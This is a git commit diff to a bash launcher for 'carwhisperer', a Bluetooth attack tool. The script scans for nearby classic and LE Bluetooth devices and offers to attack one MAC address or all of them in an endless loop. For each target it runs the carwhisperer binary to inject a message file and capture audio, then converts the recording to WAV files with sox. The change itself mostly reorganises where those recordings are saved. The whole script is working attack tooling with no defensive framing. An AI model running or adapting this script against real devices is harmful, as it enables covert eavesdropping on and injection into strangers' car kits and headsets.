80366ccef5c6076f608da7b8b947c25c6049cd81
Krzysztof Kuczewski <k.kuczewski10@gmail.com>
2025-07-24 20:41:43 +0200

    Finished the new carwhisperer start script

--- carwhisperer/start.sh
+++ carwhisperer/start.sh
@@ -4,10 +4,12 @@
 
 exec_path="carwhisperer"
 message_file="message.raw"
+output_dir="output"
 output_raw="out.raw"
-output_wav="out.wav"
+output_wav="out" # .wav is added later in the script
 
 rm -f /tmp/scan_br.txt /tmp/scan_le.txt /tmp/scan_br_f.txt /tmp/scan_le_f.txt > /dev/null
+rm -f output/* > /dev/null
 
 format_scan () {
         grep -Eo '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "$1" > "$2"
@@ -40,30 +42,42 @@ fi
 
 read -p "attack mode? (1: Attack selected mac | 2: Attack all): " attack_mode
 
+echo -e "\nAll outputs are stored in the output directory\n"
+
 
 if [ ${attack_mode} = "1" ]; then
 	rm -f "$output_raw"
 	./$exec_path $INTERFACE_BT "$message_file" "$output_raw" "$bssid"
-	sudo sox -t raw -r 8000 -c 1 -e signed-integer -b 16 --endian little "$output_raw" "$output_wav"
-	echo "File saved to $output_wav"
-
+	if [ -f "$output_raw" ]; then
+		sudo sox -t raw -r 8000 -c 1 -e signed-integer -b 16 --endian little "$output_raw" "${output_dir}/${output_wav}.wav"
+		echo "File saved to $output_wav"
+	fi	
+	
 
 elif [ ${attack_mode} = "2" ]; then
+	counter=0
         echo "Press ctrl+z/ctrl+c to force-stop the attack"
         while true; do
                 while IFS= read -r line; do # Reads an input from a file line-by-line
 			rm -f "$output_raw"
                         echo "Now attacking: $line"
 			./$exec_path $INTERFACE_BT "$message_file" "$output_raw" "$line"
-			sudo sox -t raw -r 8000 -c 1 -e signed-integer -b 16 --endian little "$output_raw" "$output_wav"
-        		echo "File saved to $output_wav"
+			if [ -f "$output_raw" ]; then
+				sudo sox -t raw -r 8000 -c 1 -e signed-integer -b 16 --endian little "$output_raw" "${output_dir}/${output_wav}-${counter}.wav"
+        			echo "File saved to ${output_wav}-${counter}.wav"
+			fi
+			((counter++))
                 done < /tmp/scan_br_f.txt
+
                 while IFS= read -r line; do # Do that a second time for LE
 			rm -f "$output_raw"
                         echo "Now attacking: $line"
 			./$exec_path $INTERFACE_BT "$message_file" "$output_raw" "$line"
-			sudo sox -t raw -r 8000 -c 1 -e signed-integer -b 16 --endian little "$output_raw" "$output_wav"
-        		echo "File saved to $output_wav"
+			if [ -f "$output_raw" ]; then
+				sudo sox -t raw -r 8000 -c 1 -e signed-integer -b 16 --endian little "$output_raw" "${output_dir}/${output_wav}-${counter}.wav"
+				echo "File saved to ${output_wav}-${counter}.wav"
+			fi
+			((counter++))
                 done < /tmp/scan_le_f.txt
         done
 else
